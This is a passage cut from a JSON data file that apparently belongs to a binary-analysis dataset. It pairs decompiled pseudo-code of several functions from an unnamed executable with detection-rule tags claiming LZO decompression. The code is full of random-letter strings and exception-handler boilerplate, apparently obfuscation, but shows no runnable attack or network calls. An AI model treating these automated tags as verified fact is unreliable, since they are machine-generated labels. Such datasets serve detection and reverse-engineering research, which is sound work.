fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1010
    },
    "004030cb": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.004030cb(uint param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uchar **ppuVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uchar *in_stack_00000034;\n    uint32_t in_stack_00000048;\n    uint uStack140;\n    uint uStack136;\n    ushort uStack132;\n    uchar uStack130;\n    uint uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    uint32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x4148c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x0040ec24:\n        ppuStack32 = ppuVar1;\n        in_stack_0000001c = 0;\n        in_stack_00000020 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (in_stack_00000048 < 0x10) {\ncode_r0x0040ec6a:\n            *in_FS_OFFSET = piStack28;\n            return 0;\n        }\n        puStack72 = in_stack_00000034;\n        if ((in_stack_00000048 + 1 < 0x1000) ||\n           (puStack72 = *(in_stack_00000034 + -4),  in_stack_00000034 + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x0040ec6a;\n        }\n    }\n    else {\n        uStack68 = param_3;\n        uVar3 = unaff_EDI;\n        if ((in_stack_00000020 + 1 < 0x1000) ||\n           (uStack68 = *(param_3 - 4),  uVar3 = uStack68,  (param_3 - 4) - uStack68 < 0x20)) {\n            in_stack_ffffffd8 = uStack68;\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = uVar3;\n            ppuVar1 = ppuStack32;\n            goto code_r0x0040ec24;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack140;\n    uStack80 = 0x4148d0;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack120 = 0xf;\n    uStack124 = 10;\n    uStack140 = 0x7a686a71;\n    uStack136 = 0x757a6465;\n    uStack132 = 0x6e64;\n    uStack130 = 0;\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 3;\n    fcn.00402f72(0x13, uStack92, \"jymtijpmlsofjsofuit\");\n    if (uStack96 < 0x10) {\ncode_r0x0040ed8c:\n        if (0xf < uStack20) {\n            uVar3 = in_stack_ffffffd8;\n            if ((0xfff < uStack20 + 1) && (uVar3 = *(in_stack_ffffffd8 - 4),  0x1f < (in_stack_ffffffd8 - 4) - uVar3))\n            goto code_r0x0040ee2e;\n            fcn.00401a32(uVar3);\n        }\n        uStack24 = 0;\n        uStack20 = 0xf;\n        if (0xf < param_2) {\n            uVar3 = unaff_EDI;\n            if ((0xfff < param_2 + 1) && (uVar3 = *(unaff_EDI - 4),  0x1f < (unaff_EDI - 4) - uVar3))\n            goto code_r0x0040ee3a;\n            fcn.00401a32(uVar3);\n        }\n        *in_FS_OFFSET = piStack84;\n        return 0;\n    }\n    arg_8h = iStack116;\n    if ((uStack96 + 1 < 0x1000) || (arg_8h = *(iStack116 + -4),  (iStack116 + -4) - arg_8h < 0x20)) {\n        fcn.00401a32(arg_8h);\n        goto code_r0x0040ed8c;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x0040ee2e:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x0040ee3a:\n    uStack76 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar2 = fcn.00403a76();\n    return uVar2;\n}\n",
        "token_count": 1433
    },
    "004031d9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.004031d9(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t aiStack88 [4];\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack88;\n    uStack24 = 0x44c900;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    aiStack88[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x21);\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x4e, uStack36, \"akaqgzmivpiohnmfnrdqkvdwlriqckzzfvpfuexqsuwafygkmjwnjxpxkeythdfdqpyfqccollfbnt\");\n    puStack40[5] = 0xf;\n    puStack40[4] = 6;\n    *puStack40 = 0x7a75666a;\n    *(puStack40 + 1) = 0x636b;\n    *(puStack40 + 6) = 0;\n    if (uStack44 < 0x10) {\ncode_r0x0043a69e:\n        if (0xf < uStack68) {\n            iVar2 = aiStack88[0];\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(aiStack88[0] + -4),  0x1f < (aiStack88[0] + -4) - iVar2))\n            goto code_r0x0043a77d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000002c) {\n            iVar2 = in_stack_00000018;\n            if ((0xfff < in_stack_0000002c + 1) &&\n               (iVar2 = *(in_stack_00000018 + -4),  0x1f < (in_stack_00000018 + -4) - iVar2)) goto code_r0x0043a789;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x0043a795;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack64;\n    if ((uStack44 + 1 < 0x1000) || (iVar2 = *(iStack64 + -4),  (iStack64 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043a69e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043a77d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043a789:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043a795:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1020
    },
    "0040329c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040329c(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44ce10;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"svfmpbnuegxmixspnrxugwjuiewvbwkbatxfbiefoggbfvvxxnthdnaiigpnk\";\n    auStack96[0] = 0x3d;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x35, uStack36, \"wgruhmucuhfxfyemoobzckrjunlgmjaahwldhlsxkabbglswhbyka\");\n    if (uStack40 < 0x10) {\ncode_r0x0044ab49:\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0044abde;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x0044abea;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x1752c;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0044ab49;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044abde:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044abea:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 796
    },
    "00403300": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint * fcn.00403300(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *extraout_ECX;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    uint32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_00000028;\n    uint in_stack_00000038;\n    uint32_t in_stack_0000003c;\n    uchar *in_stack_00000040;\n    uint32_t in_stack_00000054;\n    uint auStack280 [25];\n    uint uStack180;\n    uint uStack164;\n    uint uStack160;\n    int32_t iStack156;\n    uint32_t uStack136;\n    uint *puStack132;\n    uint *puStack128;\n    uint *puStack124;\n    uint *puStack120;\n    uchar *puStack116;\n    uchar *puStack112;\n    int32_t *piStack108;\n    uchar uStack104;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    uchar *puStack72;\n    uchar *puStack60;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    puStack84 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ce60;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar6 = &stack0xffffffe0;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x0044b7a8:\n        puStack32 = puVar6;\n        in_stack_0000001c = 0;\n        in_stack_00000020 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (0xf < in_stack_0000003c) {\n            uStack80 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (uStack80 = *(in_stack_00000028 - 4),  unaff_EDI = uStack80,  0x1f < (in_stack_00000028 - 4) - uStack80))\n            goto code_r0x0044b859;\n            uStack44 = 0x44b7eb;\n            fcn.00401a32(uStack80);\n        }\n        in_stack_00000038 = 0;\n        in_stack_0000003c = 0xf;\n        in_stack_00000028 = in_stack_00000028 & 0xffffff00;\n        if (in_stack_00000054 < 0x10) {\ncode_r0x0044b834:\n            *in_FS_OFFSET = puStack28;\n            return puStack28;\n        }\n        puStack84 = in_stack_00000040;\n        if ((in_stack_00000054 + 1 < 0x1000) ||\n           (puStack84 = *(in_stack_00000040 + -4),  uStack80 = unaff_EDI,  in_stack_00000040 + (-4 - puStack84) < 0x20))\n        {\n            uStack44 = 0x44b831;\n            fcn.00401a32(puStack84);\n            goto code_r0x0044b834;\n        }\n    }\n    else {\n        uStack80 = param_3;\n        if ((in_stack_00000020 + 1 < 0x1000) ||\n           (uStack80 = *(param_3 - 4),  unaff_EDI = uStack80,  (param_3 - 4) - uStack80 < 0x20)) {\n            uStack44 = 0x44b7a5;\n            puStack32 = &stack0xffffffe0;\n            fcn.00401a32(uStack80);\n            puVar6 = puStack32;\n            goto code_r0x0044b7a8;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0044b859:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    puStack48 = 0x44b88c;\n    fcn.004052d1();\n    puStack60 = 0x44b89c;\n    puStack48 = &stack0x00000008;\n    fcn.004052d1();\n    puStack72 = 0x44b8ac;\n    puStack60 = &stack0x00000014;\n    fcn.004052d1();\n    puStack116 = &stack0xffffff64;\n    puStack100 = &stack0xffffff64;\n    uStack92 = 0x44ce70;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    *extraout_ECX = 0;\n    extraout_ECX[4] = 0;\n    extraout_ECX[5] = 0xf;\n    *extraout_ECX = 0;\n    puStack132 = extraout_ECX + 0xc;\n    extraout_ECX[0xc] = 0;\n    extraout_ECX[0x10] = 0;\n    extraout_ECX[0x11] = 0xf;\n    *(extraout_ECX + 0xc) = 0;\n    piStack108 = &stack0xfffffee8;\n    puStack112 = &stack0xffffff4c;\n    uStack164 = 0;\n    uStack160 = 0xf;\n    uStack180 = 0;\n    uStack88 = 2;\n    puStack124 = extraout_ECX;\n    puStack72 = &stack0x00000020;\n    fcn.00402f72(0x2b, uStack104, \"mfwxnxfepabedxwlhcfremnsmtikjnutiviqbzropxk\");\n    puVar10 = piStack108;\n    puStack120 = piStack108 + 0xe;\n    piStack108[0xe] = 0;\n    puVar10[0x12] = 0;\n    puVar10[0x13] = 0xf;\n    *(puVar10 + 0xe) = 0;\n    uStack88 = 7;\n    fcn.00402f72(0x28, uStack104, \"pnciklroctqgshjzwbiupsitdnuzcglaczezltqx\");\n    puVar10 = piStack108;\n    puStack128 = piStack108 + 6;\n    piStack108[6] = 0;\n    puVar10[10] = 0;\n    puVar10[0xb] = 0xf;\n    *(puVar10 + 6) = 0;\n    uStack88 = 8;\n    fcn.00402f72(0x24, uStack104, \"mzqttlvtocfgloxcwjypmvaodnlkawvfudrt\");\n    puVar10 = piStack108;\n    *piStack108 = 0;\n    puVar10[4] = 0;\n    puVar10[5] = 0xf;\n    *puVar10 = 0;\n    uStack88 = 9;\n    fcn.00402f72(0x55, uStack104, \n                 \"csbkdkjrtxhbpndnvtnoxtztdnpqhygdxvgrtudpotfddayqxjhdhkxtfcyfwnciynwxjvfexidvonmesafkj\");\n    puVar10 = piStack108;\n    piStack108[0xd] = 0x40de6300;\n    puVar10[0xc] = 0;\n    uVar2 = *0x542afc;\n    uVar1 = *0x542af8;\n    uVar7 = *0x542af4;\n    puVar10[0x14] = *0x542af0;\n    puVar10[0x15] = uVar7;\n    puVar10[0x16] = uVar1;\n    puVar10[0x17] = uVar2;\n    puVar10[0x18] = 0x41f;\n    uStack88 = 2;\n    uVar7 = fcn.004056be();\n    puVar6 = puStack116;\n    puVar13 = puStack116 + -4;\n    *(puStack116 + -4) = uVar7;\n    piStack108 = puVar6 + -0x54;\n    puStack112 = puVar6 + -0x18;\n    *(puVar6 + -0x18) = 0;\n    *(puVar6 + -8) = 0;\n    *puVar13 = 0xf;\n    puVar6[-0x18] = 0;\n    puVar6[-0x5c] = uStack104;\n    *(puVar6 + -0x58) = \"yvzrkrnonlphtwwqcrsdp\";\n    *(puVar6 + -0x60) = 0x15;\n    *(puVar6 + -100) = 0x44baac;\n    fcn.00402f72();\n    puVar10 = piStack108;\n    puStack120 = piStack108 + 9;\n    piStack108[9] = 0;\n    puVar10[0xd] = 0;\n    puVar10[0xe] = 0xf;\n    *(puVar10 + 9) = 0;\n    uStack88 = 5;\n    puVar6[-0x68] = uStack104;\n    *(puVar6 + -100) = \"nuxirikrkwrhdsqnvoxdjgyvicnrwdaajyoolnvqnax\";\n    *(puVar6 + -0x6c) = 0x2b;\n    *(puVar6 + -0x70) = 0x44baf3;\n    fcn.00402f72();\n    puVar10 = piStack108;\n    piStack108[2] = 0;\n    puVar10[6] = 0;\n    puVar10[7] = 0xf;\n    *(puVar10 + 2) = 0;\n    uStack88 = 6;\n    puVar6[-0x74] = uStack104;\n    *(puVar6 + -0x70) = \"tdnkemtihciugexbksawmdxiyclvfyhrldqqejqkjymp\";\n    *(puVar6 + -0x78) = 0x2c;\n    *(puVar6 + -0x7c) = 0x44bb39;\n    fcn.00402f72();\n    puVar10 = piStack108;\n    *piStack108 = 0x7c4;\n    puVar10[1] = 0x162;\n    *(puVar10 + 8) = 1;\n    uStack88 = 2;\n    *(puVar6 + -0x7c) = 0x44bb59;\n    uVar7 = fcn.00403300();\n    puVar6 = puStack116;\n    *(puStack116 + -4) = uVar7;\n    piStack108 = puVar6 + -0x3c;\n    *(puVar6 + -0x34) = 0;\n    *(puVar6 + -0x24) = 0;\n    *(puVar6 + -0x20) = 0xf;\n    puVar6[-0x34] = 0;\n    puVar6[-0x44] = uStack104;\n    *(puVar6 + -0x40) = \"plrhruwedrahnrssruq\";\n    *(puVar6 + -0x48) = 0x13;\n    *(puVar6 + -0x4c) = 0x44bba1;\n    fcn.00402f72();\n    puVar10 = piStack108;\n    piStack108[1] = 0x40efa340;\n    *puVar10 = 0;\n    uVar2 = *0x542b1c;\n    uVar1 = *0x542b18;\n    uVar7 = *0x542b14;\n    puVar10[8] = *0x542b10;\n    puVar10[9] = uVar7;\n    puVar10[10] = uVar1;\n    puVar10[0xb] = uVar2;\n    puVar10[0xd] = 0x40db8700;\n    puVar10[0xc] = 0;\n    *(puVar10 + 0xe) = 1;\n    *(puVar6 + -0x4c) = 0x44bbd3;\n    uVar7 = fcn.0040329c();\n    puVar6 = puStack116;\n    *(puStack116 + -4) = uVar7;\n    piStack108 = puVar6 + -0x4c;\n    puStack112 = puVar6 + -0x20;\n    *(puVar6 + -0x20) = 0;\n    *(puVar6 + -0x10) = 0;\n    *(puVar6 + -0xc) = 0xf;\n    puVar6[-0x20] = 0;\n    puVar6[-0x54] = uStack104;\n    *(puVar6 + -0x50) = \"pyjhfqxdbkyofryrapfsmyfag\";\n    *(puVar6 + -0x58) = 0x19;\n    *(puVar6 + -0x5c) = 0x44bc1c;\n    fcn.00402f72();\n    puVar4 = piStack108;\n    *(piStack108 + 0x14) = 0;\n    *(puVar4 + 0x24) = 0;\n    *(puVar4 + 0x28) = 0xf;\n    puVar4[0x14] = 0;\n    uStack88 = 4;\n    puVar6[-0x60] = uStack104;\n    *(puVar6 + -0x5c) = \"qphvqlbignpkdaxmbalnasufzqrubdlyydijxlenvnkujababbupexwdvvxpjaida\";\n    *(puVar6 + -100) = 0x41;\n    *(puVar6 + -0x68) = 0x44bc62;\n    fcn.00402f72();\n    puVar4 = piStack108;\n    *piStack108 = 0;\n    puVar4[4] = 0;\n    *(puVar4 + 8) = 0xc33;\n    *(puVar4 + 0x10) = 0x40f11270;\n    *(puVar4 + 0xc) = 0;\n    *(puVar4 + 0x48) = 0x40dd1b40;\n    *(puVar4 + 0x44) = 0;\n    uStack88 = 2;\n    *(puVar6 + -0x68) = 0x44bc9b;\n    fcn.00401910();\n    puVar6 = puStack116;\n    puVar14 = puStack116 + -0x10;\n    *(puStack116 + -4) = 0;\n    *(puVar6 + -0x14) = 0x44bcae;\n    uVar7 = fcn.00402806();\n    puStack116 = puVar14;\n    *(puVar6 + -0x14) = uVar7;\n    piStack108 = puVar6 + -0x44;\n    *(puVar6 + -0x44) = 0;\n    *(puVar6 + -0x34) = 0;\n    *(puVar6 + -0x30) = 0xf;\n    puVar6[-0x44] = 0;\n    puVar15 = puVar6 + -0x50;\n    puVar6[-0x4c] = uStack104;\n    *(puVar6 + -0x48) = \"oquzrakjssaepdhbujcsktfj\";\n    *(puVar6 + -0x50) = 0x18;\n    *(puVar6 + -0x54) = 0x44bcef;\n    fcn.00402f72();\n    piVar5 = piStack108;\n    iVar3 = *0x542b3c;\n    iVar11 = *0x542b38;\n    iVar12 = *0x542b34;\n    piStack108[6] = *0x542b30;\n    piVar5[7] = iVar12;\n    piVar5[8] = iVar11;\n    piVar5[9] = iVar3;\n    *(piVar5 + 10) = 0;\n    piVar5[0xc] = 0x40f24fc0;\n    piVar5[0xb] = 0;\n    uVar9 = piVar5[5];\n    if (0xf < uVar9) {\n        iVar12 = *piVar5;\n        uVar8 = uVar9 + 1;\n        iVar11 = iVar12;\n        if (0xfff < uVar8) {\n            iVar11 = *(iVar12 + -4);\n            if (0x1f < (iVar12 + -4) - iVar11) {\n                uStack88 = 0;\n                *(puVar6 + -0x54) = 0x44be71;\n                fcn.004047f5();\n                goto code_r0x0044be71;\n            }\n            uVar8 = uVar9 + 0x24;\n        }\n        *(puVar6 + -0x54) = uVar8;\n        *(puVar6 + -0x58) = iVar11;\n        *(puVar6 + -0x5c) = 0x44bd43;\n        uVar9 = fcn.00401a32(*(puVar6 + -0x58));\n    }\n    puVar6 = puStack116;\n    *(puStack116 + -4) = uVar9;\n    piStack108 = puVar6 + -0x5c;\n    puStack112 = puVar6 + -0x30;\n    *(puVar6 + -0x30) = 0;\n    *(puVar6 + -0x20) = 0;\n    *(puVar6 + -0x1c) = 0xf;\n    puVar6[-0x30] = 0;\n    puVar6[-100] = uStack104;\n    *(puVar6 + -0x60) = \"geelkvtimdkiuobkgdvrobydeytuflfmgmqhqtopctpafiatwvdnnesypzbffpwotypcxbyshriufy\";\n    *(puVar6 + -0x68) = 0x4e;\n    *(puVar6 + -0x6c) = 0x44bd8f;\n    fcn.00402f72();\n    piVar5 = piStack108;\n    *piStack108 = 0;\n    piVar5[4] = 0;\n    piVar5[5] = 0xf;\n    *piVar5 = 0;\n    uStack88 = 3;\n    puVar6[-0x70] = uStack104;\n    *(puVar6 + -0x6c) =\n         \"bfxucedrbzekyqzuhgrdjyjnuxljxvvsqcaqnnwftnlbhquzcipzpesygtsecjxojdwyydldfedbsmsjyjzselaesgzwrfvtvgm\";\n    *(puVar6 + -0x74) = 99;\n    *(puVar6 + -0x78) = 0x44bdce;\n    fcn.00402f72();\n    piVar5 = piStack108;\n    piStack108[6] = *0x542b50;\n    piVar5[7] = *0x542b54;\n    piVar5[8] = *0x542b58;\n    piVar5[9] = *0x542b5c;\n    *(piVar5 + 10) = 0;\n    *(piVar5 + 0x11) = 0;\n    piVar5[0x12] = *0x542b70;\n    piVar5[0x13] = *0x542b74;\n    piVar5[0x14] = *0x542b78;\n    piVar5[0x15] = *0x542b7c;\n    piVar5[0x16] = 0x1365;\n    uStack88 = 2;\n    *(puVar6 + -0x78) = 0x44be02;\n    fcn.00404d95();\n    puVar6 = puStack116;\n    puVar15 = puStack116 + -0x28;\n    *(puStack116 + -0x28) = &stack0xffffff64;\n    *(puVar6 + -0x1c) = 0;\n    *(puVar6 + -0x2c) = 0x44be1d;\n    fcn.0040416f();\n    if (0xf < uStack136) {\n        uVar9 = uStack136 + 1;\n        iVar12 = iStack156;\n        if (0xfff < uVar9) {\n            iVar12 = *(iStack156 + -4);\n            if (0x1f < (iStack156 + -4) - iVar12) {\ncode_r0x0044be71:\n                uStack88 = 1;\n                *(puVar15 + -4) = 0x44be7d;\n                fcn.004047f5();\n                *(puVar15 + -4) = &stack0xffffffb8;\n                *(puVar15 + -0x84) = 0x44be8c;\n                fcn.004052d1();\n                *(puVar15 + -0x84) = &stack0xffffffc4;\n                *(puVar15 + -0x104) = 0x44be9c;\n                fcn.004052d1();\n                *(puVar15 + -0x104) = &stack0xffffffd0;\n                *(puVar15 + -0x184) = 0x44beaf;\n                puVar10 = fcn.00403a76();\n                return puVar10;\n            }\n            uVar9 = uStack136 + 0x24;\n        }\n        *(puVar6 + -0x2c) = uVar9;\n        *(puVar6 + -0x30) = iVar12;\n        *(puVar6 + -0x34) = 0x44be4e;\n        fcn.00401a32(*(puVar6 + -0x30));\n    }\n    *in_FS_OFFSET = iStack96;\n    return puStack124;\n}\n",
        "token_count": 5324
    },
    "00403314": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00403314(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    uint auStack148 [2];\n    char *pcStack140;\n    int32_t iStack136;\n    uint uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack148;\n    uStack24 = 0x44c310;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack120 = 0;\n    uStack116 = 0xf;\n    iStack136 = 0;\n    uStack20 = 7;\n    pcStack140 = \"wlnxjlfhenrviskjmqxsftgrkaoygcydgyxufioowfjqhftltmhexgha\";\n    auStack148[0] = 0x38;\n    fcn.00402f72();\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x40, iStack64, \"taisaxargfukyhfkcucpxqfhmwobangaqlhuflreptprlzwtpukihqrmkensaydz\");\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x40, iStack112, \"taisaxargfukyhfkcucpxqfhmwobangaqlhuflreptprlzwtpukihqrmkensaydz\");\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x40, uStack36, \"taisaxargfukyhfkcucpxqfhmwobangaqlhuflreptprlzwtpukihqrmkensaydz\");\n    if (uStack92 < 0x10) {\ncode_r0x004283dd:\n        if (0xf < uStack44) {\n            iVar2 = iStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2))\n            goto code_r0x004285b2;\n            fcn.00401a32(iVar2);\n        }\n        *puStack40 = 0;\n        puStack40[5] = 0xf;\n        puStack40[4] = 7;\n        *puStack40 = 0x78717170;\n        *(puStack40 + 3) = 0x76647a78;\n        *(puStack40 + 7) = 0;\n        if (0xf < uStack68) {\n            iVar2 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar2))\n            goto code_r0x004285be;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack116) {\n            iVar2 = iStack136;\n            if ((0xfff < uStack116 + 1) && (iVar2 = *(iStack136 + -4),  0x1f < (iStack136 + -4) - iVar2))\n            goto code_r0x004285ca;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x004285d6;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar2 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar2 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar2)) goto code_r0x004285e2;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000005c) {\n            iVar2 = in_stack_00000048;\n            if ((0xfff < in_stack_0000005c + 1) &&\n               (iVar2 = *(in_stack_00000048 + -4),  0x1f < (in_stack_00000048 + -4) - iVar2)) goto code_r0x004285ee;\n            fcn.00401a32(iVar2);\n        }\n        